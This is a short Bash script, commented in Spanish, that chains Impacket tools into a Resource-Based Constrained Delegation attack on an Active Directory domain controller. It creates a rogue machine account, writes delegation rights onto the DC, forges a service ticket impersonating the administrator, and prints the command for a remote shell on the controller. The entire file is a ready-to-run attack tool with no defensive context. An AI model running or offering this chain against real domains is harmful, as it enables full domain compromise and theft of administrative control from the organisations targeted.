#!/bin/bash
# Cadena RBCD completa: crear máquina -> delegación -> suplantar Administrator
# Uso: ./rbcd_chain.sh <DC_IP> <dominio> <usuario> <password>
set -e
IP=${1:?IP del DC}; DOM=${2:?dominio}; USER=${3:?usuario}; PASS=${4:?password}

echo "[1/3] Creando cuenta de máquina EVILPC\$..."
addcomputer.py "$DOM/$USER:$PASS" -dc-ip $IP -computer-name EVILPC -computer-pass 'EvilPass123!'

echo "[2/3] Escribiendo msDS-AllowedToActOnBehalfOfOtherIdentity en DC\$..."
rbcd.py "$DOM/$USER:$PASS" -dc-ip $IP -action write -delegate-to 'DC$' -delegate-from 'EVILPC$'

echo "[3/3] Suplantando administrator vía S4U2Proxy..."
getST.py -spn cifs/DC.$DOM -impersonate administrator -dc-ip $IP \
  "$DOM/EVILPC\$:EvilPass123!"

CC=$(ls administrator@cifs_*ccache | head -1)
echo "[+] Ticket: $CC"
echo "[i] Shell: KRB5CCNAME=\$PWD/$CC wmiexec.py -k -no-pass -target-ip $IP $DOM/administrator@dc.$DOM"
